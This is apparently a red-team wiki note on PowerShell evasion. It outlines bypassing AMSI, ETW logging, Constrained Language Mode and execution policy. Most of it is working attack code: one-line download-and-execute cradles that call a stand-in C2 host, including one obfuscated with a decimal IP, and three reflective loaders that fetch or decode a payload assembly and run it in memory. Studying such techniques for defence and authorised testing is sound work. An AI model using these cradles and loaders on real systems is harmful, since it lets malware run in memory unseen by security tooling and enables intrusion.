---
title: PowerShell
---

[[notes/windows/evasion]] with PowerShell.

Steps ([source](https://web.archive.org/web/20231227014246/https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)):

- if [[notes/windows/applocker]] enabled: bypass [[notes/windows/clm]]
- patch [[notes/windows/amsi]] in PowerShell
- optional: disable script block logging by patching [[notes/windows/etw]] in PowerShell
- patch [[notes/windows/amsi]] on process-level
- reflectively execute your .NET assembly payload (see below)

PowerShell v2 doesn't have [[notes/windows/clm]], [[notes/windows/amsi]] and [[notes/windows/etw]] script block logging, but requires .NET Framework 2.0 to be installed.

~~~ bat
powershell.exe -version 2
~~~

Ignore execution policy.

~~~ ps1
powershell.exe -ep bypass
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
Set-ExecutionPolicy -ExecutionPolicy unrestricted -Scope process -Force
~~~

Download and execute PowerShell script in memory.

~~~ ps1
iwr -useb c2.attacker.com/script.ps1 | iex
iex(irm c2.attacker.com/script.ps1)
~~~

Tiny download cradle with decimal IP address ([source](https://twitter.com/johnxor2/status/1620365760462991361)).

~~~ ps1
.'irm'3221225985/script.ps1|iex
~~~

Other tools:

- [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell), PowerShell without logging
- [Codecepticon](https://github.com/accenture/codecepticon), code obfuscator

References:

- [PowerShell-Obfuscation-Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)

# Reflective Assembly Loading

Reflective loading is blocked by [[notes/windows/clm]].
When loading your payload fails with the error *Could not load file or assembly [...]. An attempt was made to load a program with an incorrect format* your payload was blocked by [[notes/windows/amsi]].
In that case try [[notes/windows/dotnet-obfuscation]] or patch [[notes/windows/amsi]] on process-level.

Download assembly and execute when using the PowerShell GUI.

~~~ ps1
$a = @('--help')
$b = (New-Object System.Net.WebClient).DownloadData('https://c2.attacker.com/payload.exe')
$c = [System.Reflection.Assembly]::Load([byte[]] $b)
if ($c.EntryPoint.IsPublic) {
  $c.EntryPoint.ReflectedType::Main($a)
} else {
  $c.EntryPoint.ReflectedType.GetMethod('Main', [Reflection.BindingFlags] 'NonPublic,Static').Invoke($null, (,[string[]] $a))
}
~~~

Download assembly, execute and capture output when using WinRM.

~~~ ps1
$a = @('--help')
$b = (New-Object System.Net.WebClient).DownloadData('https://c2.attacker.com/payload.exe')
$c = [System.Reflection.Assembly]::Load([byte[]] $b)
$d = [Console]::Out
$e = [Console]::Error
$f = New-Object IO.StringWriter
$g = New-Object IO.StringWriter
[Console]::SetOut($f)
[Console]::SetError($g)
if ($c.EntryPoint.IsPublic) {
  $c.EntryPoint.ReflectedType::Main($a)
} else {
  $c.EntryPoint.ReflectedType.GetMethod('Main', [Reflection.BindingFlags] 'NonPublic,Static').Invoke($null, (,[string[]] $a))
}
[Console]::SetOut($d)
[Console]::SetError($e)
$e.ToString()
$f.ToString()
~~~

Base64-decode embedded assembly, decompress and execute.

~~~ powershell
$a = @('--help')
$b = [Convert]::FromBase64String('your payload')
#$b = [System.IO.File]::ReadAllBytes("$(pwd)\payload.exe")
$c = New-Object IO.Compression.GzipStream(New-Object IO.MemoryStream($b), [IO.Compression.CompressionMode]::Decompress)
$d = New-Object System.IO.MemoryStream
$c.CopyTo($d)
$e = [System.Reflection.Assembly]::Load([byte[]] $d.ToArray())
if ($e.EntryPoint.IsPublic) {
  $e.EntryPoint.ReflectedType::Main(@('--help'))
} else {
  $e.EntryPoint.ReflectedType.GetMethod('Main', [Reflection.BindingFlags] 'NonPublic,Static').Invoke($null, (,[string[]] @('--help')))
}
~~~
